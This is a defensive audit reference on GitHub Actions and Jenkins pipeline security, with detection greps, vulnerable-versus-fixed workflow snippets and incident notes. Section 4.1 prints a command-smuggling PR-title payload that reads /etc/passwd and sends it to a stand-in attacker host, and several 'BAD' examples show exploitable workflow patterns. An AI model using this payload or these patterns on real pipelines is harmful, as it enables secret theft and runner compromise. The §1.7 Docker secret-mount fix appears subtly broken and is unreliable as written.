# CI/CD Pipeline Security Reference: GitHub Actions & Jenkins

*Compiled for use as a technical audit reference. Grounded in OWASP CI/CD Top 10 (2023), GitHub's official Security Hardening guide, GitHub Security Lab research, Jenkins security advisories, SLSA.dev, and documented real-world incidents (CVE-2020-15228, CVE-2025-30066, CVE-2022-43401).*

---

## Part 0: OWASP Top 10 CI/CD Security Risks (2023)

Use this as the top-level categorization framework for severity/classification of findings. Source: [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/), [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html).

| Code | Name | One-line description |
|---|---|---|
| **CICD-SEC-1** | Insufficient Flow Control Mechanisms | Pipeline lacks controls to prevent unauthorized modification of code/config as it flows through the pipeline (e.g., no required reviews before a stage runs). |
| **CICD-SEC-2** | Inadequate Identity and Access Management | Weak authentication/authorization for pipeline actors — humans, bots, and services — including shared or long-lived credentials. |
| **CICD-SEC-3** | Dependency Chain Abuse | Attackers exploit the way build tooling resolves dependencies/plugins/actions (typosquatting, dependency confusion, malicious packages). |
| **CICD-SEC-4** | Poisoned Pipeline Execution (PPE) | Attacker with limited repo/pipeline-config write access injects malicious steps or definitions that execute with the pipeline's full privileges (direct, indirect, and public PPE variants). |
| **CICD-SEC-5** | Insufficient PBAC (Pipeline-Based Access Controls) | Pipeline configuration itself (not just the CI system's IAM) is a control plane that isn't scoped — e.g., a shared runner/job can read secrets or resources belonging to other pipelines. |
| **CICD-SEC-6** | Insufficient Credential Hygiene | Hardcoded, over-scoped, unrotated, or improperly stored secrets and credentials used by the pipeline. |
| **CICD-SEC-7** | Insecure System Configuration | Misconfigured CI/CD platform settings — disabled CSRF/sandbox protections, verbose logging, permissive defaults, exposed admin interfaces. |
| **CICD-SEC-8** | Ungoverned Usage of 3rd Party Services | Unreviewed/ungoverned integrations (marketplace actions, plugins, webhooks) granted access to the pipeline or its secrets. |
| **CICD-SEC-9** | Improper Artifact Integrity Validation | Artifacts consumed or promoted between pipeline stages without verifying signatures/hashes, enabling substitution or poisoning. |
| **CICD-SEC-10** | Insufficient Logging and Visibility | Inadequate audit trail of pipeline changes and runs, delaying detection of compromise. |

---

## Part 1: Secrets & Credential Exposure

### 1.1 Hardcoded secrets/tokens in workflow or Jenkinsfile source
- **Severity:** Critical — a plaintext credential committed to source control is immediately compromised (visible to anyone with read access, and persists in git history even after removal).
- **Detect (GitHub Actions YAML):** string literals assigned to `env:`, `with:`, or inline in `run:` that match secret shapes rather than `${{ secrets.* }}` or `${{ vars.* }}`, e.g.:
  ```
  grep -RnE '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|xox[baprs]-[0-9A-Za-z-]+|-----BEGIN (RSA|EC|OPENSSH|PGP) PRIVATE KEY-----)' .github/workflows/
  ```
  Also flag any `with:`/`env:` value that is a bare string near keys named `password`, `token`, `secret`, `api_key`, `apikey` that is *not* `${{ secrets.X }}`.
- **Detect (Jenkinsfile Groovy):** string literals passed to `sh`, environment blocks, or plugin `with:`-equivalents instead of `credentials()`/`withCredentials`:
  ```
  grep -RnE "(password|passwd|token|apikey|api_key|secret)\s*[:=]\s*['\"][^'\"]{6,}['\"]" Jenkinsfile*
  ```
- **Fix (GitHub Actions):**
  ```yaml
  # BAD
  - run: curl -u admin:Sup3rSecret123 https://api.example.com

  # GOOD
  - run: curl -u "admin:${TOKEN}" https://api.example.com
    env:
      TOKEN: ${{ secrets.API_TOKEN }}
  ```
- **Fix (Jenkinsfile):**
  ```groovy
  // BAD
  sh "curl -u admin:Sup3rSecret123 https://api.example.com"

  // GOOD
  withCredentials([usernamePassword(credentialsId: 'api-cred', usernameVariable: 'USR', passwordVariable: 'PSW')]) {
    sh 'curl -u "$USR:$PSW" https://api.example.com'
  }
  ```
- **Source:** OWASP CICD-SEC-6 (Insufficient Credential Hygiene); [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html) ("never hardcode secrets… deploy git-leaks/git-secrets").

### 1.2 Secrets echoed to logs / dumped via env
- **Severity:** High — GitHub masks known secret *values* in logs, but only if the exact string is referenced via `secrets.*`; derived, re-encoded, partial, or manually-`echo`'d values are **not masked**, and `env | sort` / `printenv` dumps in debug steps leak everything.
- **Detect:** `run:` steps containing `env`, `printenv`, `set -x` combined with commands reading secret-bound env vars, or `echo "$SECRET_VAR"`/`echo ${{ secrets.X }}` used for debugging; Jenkins `sh 'env'`, `sh 'set'`, or `echo` of a credentials-bound variable outside a masked context.
  ```
  grep -RnE '(echo\s+\$\{\{\s*secrets\.|echo\s+"\$[A-Z_]*(TOKEN|SECRET|KEY|PASSWORD)|(^|\s)env\b\s*$|printenv)' .github/workflows/ Jenkinsfile*
  ```
- **Fix:** Never print secret-bound variables; use `::add-mask::` explicitly for any sensitive value not natively coming from `secrets.*` (e.g., a value derived at runtime):
  ```yaml
  - name: Mask derived secret
    run: |
      DERIVED=$(some-command)
      echo "::add-mask::$DERIVED"
      echo "derived=$DERIVED" >> "$GITHUB_OUTPUT"
  ```
  In Jenkins, avoid `sh 'env'`/debug dumps in pipelines that use `withCredentials`; the Credentials Binding plugin masks known bound values in console output but **does not** mask them if concatenated/transformed (e.g., base64-encoded) before printing — flag any transformation of a bound credential variable.
- **Source:** [GitHub Docs – Security hardening for GitHub Actions § Secrets](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions) ("mask sensitive data... `::add-mask::VALUE`"); [Jenkins credentials-binding-plugin README](https://github.com/jenkinsci/credentials-binding-plugin/blob/master/README.md) (masking limitations, manipulation/concatenation caveat); real-world case: the tj-actions/changed-files incident (CVE-2025-30066, see §2.6) exfiltrated secrets precisely by dumping runner memory to logs as double-base64-encoded strings to defeat GitHub's log masking.

### 1.3 Using `env:` context where `secrets:` should be used (or vice versa misunderstanding scope)
- **Severity:** Medium — `env:` values set at workflow/job level are visible to every step (including third-party actions and any `run:` script), widening blast radius versus scoping a secret to only the step that needs it.
- **Detect:** `secrets.*` referenced once and then re-exported as a **workflow-level or job-level** `env:` var consumed by many steps, especially where later steps run third-party actions:
  ```yaml
  # BAD - secret exposed to every step in the job, including 3rd-party actions
  env:
    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
  jobs:
    build:
      steps:
        - uses: some-third-party/action@v1   # can read DEPLOY_KEY from env
        - run: ./deploy.sh
  ```
- **Fix:** Scope secrets to the **step** level, only where consumed:
  ```yaml
  jobs:
    build:
      steps:
        - uses: some-third-party/action@<sha>
        - run: ./deploy.sh
          env:
            DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
  ```
- **Source:** [GitHub Actions Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html) — "Pass secrets at step level, not job level."

### 1.4 Missing use of a secrets manager / vault for long-lived credentials
- **Severity:** Medium-High (depends on what the credential can access) — native `secrets:`/Jenkins Credentials store is acceptable, but static, long-lived, high-privilege cloud credentials (AWS/GCP/Azure keys) stored as plain CI secrets instead of brokered through a vault or OIDC increase blast radius on any pipeline compromise.
- **Detect:** Presence of long-lived cloud credential env vars (`AWS_SECRET_ACCESS_KEY`, `AZURE_CLIENT_SECRET`, `GOOGLE_APPLICATION_CREDENTIALS` pointing to a static key file) with no corresponding `permissions: id-token: write` / `aws-actions/configure-aws-credentials` OIDC role-assumption pattern, or no HashiCorp Vault / AWS Secrets Manager / CyberArk integration for a shop with heavy secret use.
- **Fix:** Prefer OIDC federation (see §3.6) or a centralized secrets manager with short-lived leases over static CI secrets.
- **Source:** OWASP CI/CD Security Cheat Sheet — "Use third-party solutions (HashiCorp Vault, AWS Secrets Manager, CyberArk) for centralized management."

### 1.5 Secrets exposed to fork PRs via `pull_request_target` / `workflow_run`
- **Severity:** Critical — this is the single most impactful GitHub Actions misconfiguration class ("pwn requests"); it hands secrets and a write-scoped `GITHUB_TOKEN` to code effectively controlled by an external, untrusted contributor.
- **Detect:**
  ```
  grep -RnA5 'pull_request_target' .github/workflows/*.yml | grep -E 'uses:\s*actions/checkout' 
  ```
  Specifically flag `pull_request_target` (or `workflow_run` triggered by a `pull_request`-triggered workflow) where a later step does `actions/checkout` **with** `ref: ${{ github.event.pull_request.head.sha }}` (or `head.ref`) and then executes any build/test/install command (`npm install`, `make`, `pytest`, arbitrary `run:`) against that checked-out code.
- **Fix — vulnerable pattern:**
  ```yaml
  # INSECURE
  on: pull_request_target
  jobs:
    build:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        - run: npm install && npm run build   # attacker-controlled code with secrets in scope
        - run: echo "${{ secrets.NPM_TOKEN }}" | npm publish
  ```
  **Fix — split privileged/unprivileged workflows (GitHub's documented "Preventing pwn requests" pattern):**
  ```yaml
  # ReceivePR.yml — runs untrusted code, NO secrets, default token permissions minimized
  on: pull_request
  permissions: {}
  jobs:
    build:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@<sha>
        - run: npm install && npm run build
        - run: echo "${{ github.event.number }}" > pr_number.txt
        - uses: actions/upload-artifact@<sha>
          with: { name: pr, path: pr_number.txt }

  # CommentPR.yml — privileged, never checks out PR code
  on:
    workflow_run:
      workflows: ["Receive PR"]
      types: [completed]
  permissions:
    pull-requests: write
  jobs:
    comment:
      if: github.event.workflow_run.event == 'pull_request'
      runs-on: ubuntu-latest
      steps:
        - name: Download PR number artifact and act on it (no untrusted code execution)
          uses: actions/github-script@<sha>
          with:
            script: |
              // fetch artifact, read pr_number.txt, then comment using secrets.GITHUB_TOKEN
  ```
  If `pull_request_target` truly must check out PR code (e.g., to label it), never run any command from that checkout, and never reference `secrets.*` in the same job.
- **Source:** [GitHub Security Lab – "Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests"](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/); [GitHub Docs – Security hardening for GitHub Actions](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions); OWASP CICD-SEC-4 (Poisoned Pipeline Execution).

### 1.6 Jenkins Credentials Binding plugin misuse
- **Severity:** High — improper use defeats the plugin's masking and leaks the credential to console log or downstream processes.
- **Detect (Groovy):**
  - Double-quoted strings interpolating a bound variable (Groovy string interpolation happens *before* the shell sees it, bypassing masking boundaries and risking injection — see §4.5):
    ```groovy
    withCredentials([usernamePassword(credentialsId: 'x', usernameVariable: 'U', passwordVariable: 'P')]) {
      sh "curl -u $U:$P https://example.com"   // BAD: double-quoted Groovy string
    }
    ```
  - Credentials read via `credentials()` helper in `environment {}` block, then written to a file with `sh` and cat'd out, or passed to `writeFile`, or used to construct another string that's echoed.
  - Use of deprecated `EnvInject`-style raw credential exposure without the binding step at all.
- **Fix:**
  ```groovy
  withCredentials([usernamePassword(credentialsId: 'x', usernameVariable: 'U', passwordVariable: 'P')]) {
    sh 'curl -u "$U:$P" https://example.com'   // GOOD: single-quoted, shell expands, masking applies
  }
  ```
  Also: scope `withCredentials` to the smallest block possible, and use `credentialsId` referencing Jenkins' encrypted Credentials Store — never `Secret text` pasted into the Jenkinsfile itself.
- **Source:** [Jenkins Credentials Binding Plugin docs](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/) — "use a single quote instead of a double quote whenever you can."

### 1.7 Secrets in Docker build args (`docker build --build-arg`)
- **Severity:** High — `ARG`/`--build-arg` values are persisted in image history (`docker history`) and often in intermediate layers, and are visible via `docker inspect`/layer diffing even if not present in the final layer's filesystem.
- **Detect:**
  ```
  grep -RnE '(docker build.*--build-arg\s+.*(PASSWORD|TOKEN|SECRET|KEY)=|ARG\s+.*(PASSWORD|TOKEN|SECRET|KEY))' Jenkinsfile* .github/workflows/ Dockerfile*
  ```
- **Fix:** Use BuildKit secret mounts, not build args:
  ```dockerfile
  # BAD
  ARG NPM_TOKEN
  RUN echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc && npm install

  # GOOD (BuildKit secret mount — never written to a layer)
  RUN --mount=type=secret,id=npm_token \
      NPM_TOKEN=$(cat /run/secrets/npm_token) \
      echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc && npm install && rm .npmrc
  ```
  ```yaml
  # GitHub Actions invocation
  - run: |
      docker buildx build --secret id=npm_token,env=NPM_TOKEN -t myimage .
    env:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
  ```
  In Jenkins, similarly avoid `sh "docker build --build-arg TOKEN=${env.TOKEN} ."`; use `--secret` with BuildKit and `withCredentials` to source the value, or use a credentials-mounted file via `docker run -v`.
- **Source:** Docker's own documented guidance on `--build-arg` history persistence; OWASP CICD-SEC-6.

---

## Part 2: Supply Chain & Dependency Pinning

### 2.1 GitHub Actions referenced by mutable tag/branch instead of pinned SHA
- **Severity:** High — a mutable ref (`@v4`, `@main`, `@master`, `@v4.1`) lets the action's maintainer (or anyone who compromises their account/token, as happened with tj-actions) silently swap what code you execute, retroactively, with no diff visible in your own repo.
- **Detect:**
  ```
  grep -RnE 'uses:\s*[A-Za-z0-9._-]+/[A-Za-z0-9._-]+@(v?[0-9]+(\.[0-9]+)*|main|master|latest)\b' .github/workflows/
  ```
  (Anything after `@` that is not a 40-character hex string is unpinned.) Tools: `zizmor` (`unpinned-uses` rule), GitHub's own "Dependabot"/"dependency review", or `pin-github-action`.
- **Fix:**
  ```yaml
  # BAD
  - uses: actions/checkout@v4
  - uses: some-org/some-action@main

  # GOOD — pin to full commit SHA, keep human-readable version as a comment
  - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675 # v3.5.2
  ```
  Enforce via Dependabot (`.github/dependabot.yml` with `package-ecosystem: "github-actions"`) so pinned SHAs still get automated bump PRs; verify each bump PR before merging (or require review) rather than trusting Dependabot's auto-merge blindly.
- **Real-world grounding:** The **tj-actions/changed-files supply chain attack (CVE-2025-30066, March 2025)** — an attacker compromised a maintainer bot's PAT and *retagged* existing version tags (e.g. `v35`, `v44`) to point at a malicious commit that dumped CI runner memory (including secrets) into build logs as base64. Every consumer pinned to a **tag** (`@v35`) was silently affected; consumers pinned to the **original commit SHA** were not, unless they had recently updated. This is the canonical, named, dated proof for why SHA-pinning matters. Sources: [Wiz Blog](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066), [CISA Alert](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction), [GHSA-mrrh-fwg8-r2c3](https://github.com/advisories/ghsa-mrrh-fwg8-r2c3).
- **Source:** [GitHub Docs – Security hardening for GitHub Actions § Using third-party actions](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions) — "Pinning an action to a full-length commit SHA is currently the only way to use an action as an immutable release."; OWASP CICD-SEC-3 (Dependency Chain Abuse).

### 2.2 `@main`/`@master` specifically, and "impostor commit" risk
- **Severity:** High — branch refs move on every push to that branch and additionally may not even resolve to the org the name implies if a fork uses the same short name in `uses:` resolution edge cases.
- **Detect:** Same regex as 2.1, specifically `@main|@master|@develop|@latest`.
- **Fix:** Same as 2.1. Additionally verify the pinned SHA actually belongs to the claimed org/repo (not a fork) — `zizmor`'s `impostor-commit` rule automates this check.
- **Source:** [OWASP GitHub Actions Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html) — "Verify commit belongs to specified organization (use Zizmor `impostor-commit` rule)."

### 2.3 Third-party/marketplace actions from unverified or low-trust publishers
- **Severity:** Medium-High depending on permissions granted to the job — an action from an unmaintained or single-maintainer repo with no "Verified creator" badge is an unaudited third-party code execution dependency running with your job's full context (including secrets available via `env`).
- **Detect:** Enumerate all `uses:` targets not under `actions/`, `github/`, or your org; flag any lacking recent commits/releases, single contributor, no linked security policy, or not GitHub "Verified creator" marked.
- **Fix:** Prefer official/verified actions or reimplement the small amount of logic directly via `run:`/`actions/github-script`; if a third-party action must be used, pin to SHA (2.1), minimize job `permissions:` (Part 3), and audit the action's source before adopting.
- **Source:** OWASP GitHub Actions Cheat Sheet #12 "Vet Third-Party Actions"; OWASP CICD-SEC-8 (Ungoverned Usage of 3rd Party Services).

### 2.4 Jenkins plugins not pinned to a specific version
- **Severity:** Medium-High — `plugins.txt`/Plugin Manager configured to always pull "latest" means an upstream plugin compromise or breaking change auto-propagates to your controller with no gate.
- **Detect:** `plugins.txt` / Jenkins Configuration-as-Code (`jenkins.yaml`) entries lacking a version pin (`pluginname` with no `:X.Y.Z` suffix), or Docker `jenkins/jenkins` images with `install-plugins.sh` invoked without explicit versions.
  ```
  grep -RnE '^[a-zA-Z0-9_-]+$' plugins.txt   # bare plugin name, no ':version' pin
  ```
- **Fix:**
  ```
  # BAD (plugins.txt)
  git
  workflow-aggregator

  # GOOD
  git:5.2.1
  workflow-aggregator:596.v8c21c963d92d
  ```
  Track plugin updates deliberately (staging controller + changelog review) rather than "always latest," consistent with Jenkins' own recommendation to review [Jenkins Security Advisories](https://www.jenkins.io/security/advisory/) before bumping plugins that have had recent sandbox-bypass CVEs (e.g. **CVE-2022-43401**, Script Security / Pipeline Groovy sandbox bypass — [GHSA-7vr5-72w7-q6jc](https://github.com/advisories/GHSA-7vr5-72w7-q6jc)).
- **Source:** Jenkins periodic [Security Advisories](https://www.jenkins.io/security/advisory/2026-08-05/) (frequent plugin CVEs, several per month, including recent 2026-06-24 and 2026-08-05 advisories); OWASP CICD-SEC-3.

### 2.5 Unpinned base Docker images (`FROM ... :latest`)
- **Severity:** Medium-High — `latest` is mutable and non-reproducible; a build today and the "same" build tomorrow can pull a different, potentially vulnerable or backdoored image.
- **Detect:**
  ```
  grep -RnE '^FROM\s+\S+(:latest)?\s*$' Dockerfile*
  grep -RnE "image:\s*['\"]?[^'\"]+:latest['\"]?" Jenkinsfile* .github/workflows/
  ```
  (Note: `FROM image` with no tag at all defaults to `:latest` implicitly — flag that too.)
- **Fix:**
  ```dockerfile
  # BAD
  FROM node:latest

  # GOOD — pin to digest for full immutability, or at minimum a specific version tag
  FROM node:20.11.1-bookworm-slim@sha256:2edf75f1c8e3c69dd...
  ```
  In a GitHub Actions `container:` job or Jenkins `agent { docker { image ... } }`, apply the same digest-pinning.
- **Source:** [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker) (image provenance/pinning controls); Docker's own guidance against `latest` in production pipelines.

### 2.6 Lack of Dependabot/Renovate coverage for action/plugin versions
- **Severity:** Low-Medium (compensating control, not itself exploitable, but its absence means known-vulnerable pinned versions never get flagged).
- **Detect:** No `.github/dependabot.yml` with a `github-actions` ecosystem entry, or no Renovate config covering `.github/workflows/**` and Jenkins `plugins.txt`.
- **Fix:**
  ```yaml
  # .github/dependabot.yml
  version: 2
  updates:
    - package-ecosystem: "github-actions"
      directory: "/"
      schedule:
        interval: "weekly"
  ```
- **Source:** [GitHub Docs – Security hardening for GitHub Actions § Keeping actions up to date](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions); OWASP GitHub Actions Cheat Sheet #14 "Automate Dependency Updates."

### 2.7 Typosquatting risk in action/dependency names
- **Severity:** Medium — a workflow referencing `action/checkout` (missing the `s`) or a similarly-misspelled package name may resolve to an attacker-published lookalike.
- **Detect:** Diff `uses:` org/repo names and `npm`/`pip`/plugin names against a known-good allowlist; flag near-matches (Levenshtein distance 1-2) to well-known actions/packages (`actions/checkout` vs `action/checkout`, `actions/setup-node` vs `action-setup-node`).
- **Fix:** Maintain (or enforce via a GitHub org policy / OPA rule) an allowlist of approved actions; use `actions/*` and `github/*` canonical namespaces only.
- **Source:** OWASP CICD-SEC-3 (Dependency Chain Abuse) explicitly enumerates typosquatting and dependency confusion as a sub-risk.

### 2.8 SLSA provenance — missing build provenance/attestation
- **Severity:** Medium (organizational maturity gap rather than a single exploitable bug, but blocks detection of tampering).
- **Detect:** No use of `actions/attest-build-provenance`, no `slsa-github-generator` reusable workflow, no `cosign`/Sigstore signing step for produced artifacts/images; Jenkins pipelines with no `in-toto`/provenance attestation for published artifacts.
- **Fix:** Adopt SLSA Build levels progressively:
  - **SLSA Build L1** — Provenance exists (document how build happened; can be unsigned).
  - **SLSA Build L2** — Provenance generated on a **hosted build platform** and **digitally signed** (e.g., GitHub-hosted runners + `actions/attest-build-provenance`), so forging it "requires an explicit attack."
  - **SLSA Build L3** — **Hardened build platform** with isolation so build steps cannot tamper with the provenance-signing process or influence other runs (build-to-build isolation).
  ```yaml
  - uses: actions/attest-build-provenance@<sha>
    with:
      subject-path: "dist/*.tar.gz"
  ```
- **Source:** [SLSA.dev v1.0 spec, Build track levels](https://slsa.dev/spec/v1.0/levels); OWASP CICD-SEC-9 (Improper Artifact Integrity Validation).

---

## Part 3: Permissions & Least Privilege

### 3.1 Missing top-level `permissions:` block (default `GITHUB_TOKEN` scope)
- **Severity:** High — on repos/orgs still configured with the legacy default, `GITHUB_TOKEN` gets broad **read-write** access to contents, issues, PRs, packages, etc. for every workflow run; even on repos where the org default is read-only, an explicit, auditable block is the correct control rather than relying on an org setting that could change.
- **Detect:**
  ```
  # Workflow file has no top-level `permissions:` key at all
  grep -L '^permissions:' .github/workflows/*.yml
  ```
- **Fix:**
  ```yaml
  # GOOD — deny by default, then grant per-job only what's needed
  permissions: {}

  jobs:
    build:
      permissions:
        contents: read
      steps: ...
    release:
      permissions:
        contents: write
        packages: write
      steps: ...
  ```
- **Source:** [GitHub Docs – Security hardening for GitHub Actions § Using the GITHUB_TOKEN](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions) — "set the default permission for the GITHUB_TOKEN to read access only"; OWASP CICD-SEC-5 (Insufficient PBAC).

### 3.2 `permissions: write-all` (or equivalent broad grants)
- **Severity:** High — an explicit maximal grant is worse than the implicit legacy default in that it's a deliberate widening, often added to silence a permissions error without diagnosing which single scope was actually needed.
- **Detect:**
  ```
  grep -RnE 'permissions:\s*write-all' .github/workflows/
  ```
- **Fix:** Identify the exact failing API call/scope and grant only that:
  ```yaml
  # BAD
  permissions: write-all

  # GOOD
  permissions:
    pull-requests: write   # only what's needed, e.g. to post a PR comment
  ```
- **Source:** GitHub Actions permissions documentation (granular scopes: `actions`, `checks`, `contents`, `deployments`, `id-token`, `issues`, `packages`, `pull-requests`, `security-events`, `statuses`, etc.); OWASP CICD-SEC-5.

### 3.3 Missing per-job permission scoping in multi-job workflows
- **Severity:** Medium — a workflow-level `permissions:` grant (even a reasonably scoped one) applies to *every* job, including jobs (like linting) that need none of it.
- **Detect:** Workflow-level `permissions:` present but individual jobs don't override/narrow it, especially where one job checks out/builds untrusted input and another job deploys/publishes.
- **Fix:** Move `permissions:` to job level; leave top-level `permissions: {}` as the safe default and grant per job.
- **Source:** GitHub Docs, same as 3.1; OWASP CICD-SEC-5.

### 3.4 Jenkins agents/executors running as root
- **Severity:** High — a compromised build step (malicious dependency, injected script) escalates directly to full host/root compromise, and on shared controllers, root-level agents can access other jobs' workspace or credentials on the same host.
- **Detect:** Jenkins agent Docker images or `agent { docker { image ... } }` blocks with no `-u` non-root flag; agent node configuration running the `jenkins`/`agent` service as `root` (check `/etc/init.d/jenkins`, systemd unit `User=` directive, or Kubernetes agent pod templates lacking a `securityContext.runAsNonRoot: true`).
- **Fix:**
  ```groovy
  agent {
    docker {
      image 'node:20-bookworm-slim'
      args '-u 1000:1000'   // run as non-root uid
    }
  }
  ```
  ```yaml
  # Kubernetes agent pod template
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  ```
- **Source:** [Jenkins Security documentation](https://www.jenkins.io/doc/book/security/) — "Builds should not be executed on the built-in node" (controller isolation principle extends to not running privileged); CIS-style hardening guidance for containerized build agents.

### 3.5 Missing Jenkins Pipeline sandboxing / Script Security approvals
- **Severity:** Critical when disabled/bypassed — the Script Security plugin's sandbox is the primary control preventing arbitrary Groovy (and thus arbitrary Java/host) execution by anyone who can edit a Jenkinsfile or Pipeline script; sandbox-escape CVEs are a recurring, actively-patched vulnerability class.
- **Detect:**
  - `Jenkinsfile`/Pipeline configured with **"Use Groovy Sandbox" unchecked**, or admins routinely approving arbitrary signatures in *In-process Script Approval* without review.
  - Use of `@NonCPS`/`Grape`/reflection tricks (`this.class.classLoader`, `Class.forName`, `System.getProperty`) known to be common sandbox-escape vectors historically.
  ```
  grep -RnE '(class\.forName|\.classLoader|System\.getProperty|@Grab|@Grapes)' Jenkinsfile*
  ```
- **Fix:** Keep sandbox mode **enabled** for all pipelines authored by non-admins; keep Script Security and Pipeline: Groovy plugins patched (multiple sandbox-bypass CVEs have been fixed over time, e.g. **CVE-2022-43401**); restrict who can approve pending script signatures (`Manage Jenkins → In-process Script Approval`) to trusted admins, and treat any approval request for a suspicious signature (`java.lang.Runtime execute`, reflection APIs) as a red flag rather than rubber-stamping it.
- **Source:** [CVE-2022-43401 / GHSA-7vr5-72w7-q6jc](https://github.com/advisories/GHSA-7vr5-72w7-q6jc) — "Sandbox bypass vulnerabilities in Jenkins Script Security Plugin and in Pipeline: Groovy Plugin"; [Jenkins Security Advisories index](https://www.jenkins.io/security/advisory/) (recurring advisory series, e.g. 2026-06-24, 2026-08-05).

### 3.6 OIDC vs long-lived cloud credentials for deployment
- **Severity:** Medium-High — static, long-lived cloud IAM keys stored as CI secrets are a standing target; if leaked (log exposure, compromised action, etc.) they remain valid until manually rotated.
- **Detect (GitHub Actions):** Deployment steps using `aws-access-key-id`/`aws-secret-access-key` as static secrets, or `GOOGLE_APPLICATION_CREDENTIALS` pointing to a long-lived service account JSON key, instead of `permissions: id-token: write` + `aws-actions/configure-aws-credentials` with `role-to-assume`.
  ```
  grep -RnE 'aws-secret-access-key:\s*\$\{\{\s*secrets\.' .github/workflows/
  ```
- **Fix:**
  ```yaml
  permissions:
    id-token: write   # required for OIDC
    contents: read
  steps:
    - uses: aws-actions/configure-aws-credentials@<sha>
      with:
        role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-role
        aws-region: us-east-1
    # no static AWS keys stored anywhere
  ```
- **Fix (Jenkins):** Use a workload-identity/vault broker to mint short-lived cloud credentials at pipeline start (e.g., HashiCorp Vault AWS secrets engine, or cloud-native workload identity for Jenkins agents running in Kubernetes/EC2 with IAM instance roles) rather than static keys in the Credentials store.
- **Source:** [GitHub Docs – Security hardening for GitHub Actions § About security hardening with OpenID Connect](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions) — "you can configure your workflows to authenticate directly to the cloud provider… stop storing these credentials as long-lived secrets"; OWASP CICD-SEC-2 (Inadequate IAM), CICD-SEC-6.

---

## Part 4: Injection & Untrusted Input Handling

### 4.1 Classic GitHub Actions script injection via `${{ }}` interpolation into `run:`
- **Severity:** Critical — this is the most common, most impactful, and most concretely-documented GitHub Actions vulnerability class. It results in arbitrary shell command execution on the runner, in-scope of any secrets/tokens available to that job.
- **Mechanism:** `run:` steps are compiled into a temporary shell script; `${{ expr }}` values are substituted **before** the shell interprets the script (simple textual substitution), not passed as a shell-escaped argument. If the substituted value is attacker-controlled and contains shell metacharacters, it becomes part of the script itself.
- **Untrusted/attacker-controlled contexts** (non-exhaustive, per GitHub Security Lab):
  - `github.event.issue.title`, `github.event.issue.body`
  - `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.pull_request.head.ref` (branch name), `github.event.pull_request.head.label`
  - `github.event.comment.body`, `github.event.review.body`
  - `github.event.commits[*].message`, `github.event.head_commit.message`, `github.event.head_commit.author.email/name`
  - `github.head_ref` (workflow-level shorthand for the same branch name)
  - `github.event.discussion.title/body`
- **Detect:**
  ```
  grep -RnE '(run:.*\$\{\{\s*(github\.event\.(issue|pull_request|comment|review|commits|head_commit|discussion)\.[a-zA-Z_.]+|github\.head_ref)\s*\}\})' .github/workflows/
  ```
  More generally: any `${{ github.event.* }}` (or `github.head_ref`) expression appearing **directly inside a `run:` block's script body** (not inside an `env:` value) is a finding. Tools: CodeQL's `actions-code-injection-critical` query, `zizmor`'s `template-injection` rule.
- **Vulnerable example:**
  ```yaml
  - name: Check PR title
    run: |
      title="${{ github.event.pull_request.title }}"
      if [[ "$title" =~ ^octocat ]]; then echo "ok"; fi
  ```
  An attacker opens a PR titled: `a"; curl attacker.com/$(cat /etc/passwd | base64) #` — this is spliced verbatim into the generated shell script and executes.
- **Fix:** Always pass untrusted context values through an **intermediate environment variable**, never directly in the script body:
  ```yaml
  - name: Check PR title
    env:
      TITLE: ${{ github.event.pull_request.title }}
    run: |
      if [[ "$TITLE" =~ ^octocat ]]; then echo "ok"; fi
  ```
  This works because the value is passed to the shell as an environment variable (via the OS env-var mechanism), not textually spliced into the script source — shell metacharacters in `$TITLE` are inert until/unless the script itself misuses `eval`/`$(...)` on it.
- **Source:** [GitHub Security Lab – "Keeping your GitHub Actions and workflows secure Part 2: Untrusted input"](https://securitylab.github.com/resources/github-actions-untrusted-input/) (canonical writeup, includes the exact vulnerable/fixed pattern above); [GitHub Docs – Security hardening § Understanding the risk of script injections](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions); [CodeQL code-injection-critical query](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/); real GHSL advisories exploiting this exact pattern: [GHSL-2023-106 (textualize/rich)](https://securitylab.github.com/advisories/GHSL-2023-106_Rich/), [GHSL-2024-277 (Appsmith, expression injection)](https://securitylab.github.com/advisories/GHSL-2024-277_Appsmith/).

### 4.2 `pull_request_target` + untrusted checkout (see also §1.5)
- Cross-reference: this is both a secrets-exposure issue (1.5) and an injection issue — the "poisoned pipeline execution" pattern where the untrusted PR's own `Makefile`, `package.json` `scripts`, pre-commit hooks, or build tooling is what actually executes the payload once checked out into a privileged context. Detection and fix are identical to §1.5.
